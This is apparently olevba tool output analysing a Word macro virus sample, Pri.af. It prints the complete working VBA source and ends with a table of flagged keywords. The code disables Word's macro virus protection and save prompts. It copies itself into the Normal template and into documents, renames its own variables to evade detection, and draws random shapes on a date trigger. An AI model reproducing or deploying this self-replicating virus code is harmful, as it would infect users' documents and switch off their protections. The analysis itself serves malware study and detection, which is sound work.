olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-96889dabafc4de06e75a9dc829c2c9a08d30816a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-96889dabafc4de06e75a9dc829c2c9a08d30816a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
UP8171 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TQ2857 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set IE2316 = ActiveDocument.VBProject.VBComponents.Item(1)
QV3081 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set IE2316 = NormalTemplate.VBProject.VBComponents.Item(1)
DP5892 = True
Call UD4611_FL5932
ActiveDocument.Saved = True
End If
If DP5892 <> True And QV3081 <> True Then GoTo PR3298
If DP5892 = True Then IE2316.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UP8171 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If QV3081 = True Then IE2316.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TQ2857 - 3))
PR3298:
If TQ2857 <> 0 And UP8171 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function UD4611_FL5932()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "HH1839": r1(2) = "GA8175": r1(3) = "NU3442": r1(4) = "CF5775": r1(5) = "FL5932": r1(6) = "UP8171"
r1(7) = "TQ2857": r1(8) = "QV3081":: r1(9) = "IE2316": r1(10) = "DP5892": r1(11) = "PR3298": r1(12) = "UD4611": r1(13) = "CE9142": r1(14) = "KN5217"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FL5932(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function FL5932(KN5217, CE9142 As String)
On Error Resume Next
Dim HH1839 As Long: Dim GA8175 As Long: Dim NU3442 As Long: Dim CF5775 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
HH1839 = 1: GA8175 = 1: NU3442 = .CountOfLines: CF5775 = Len(.Lines(.CountOfLines, 1))
Do While .Find(CE9142, HH1839, GA8175, NU3442, CF5775, True)
strline = .Lines(HH1839, 1)
strline = Left(strline, GA8175 - 1) & KN5217 & Mid(strline, CF5775)
.replaceline HH1839, strline
HH1839 = NU3442 + 1: GA8175 = 1:
NU3442 = .CountOfLines
CF5775 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
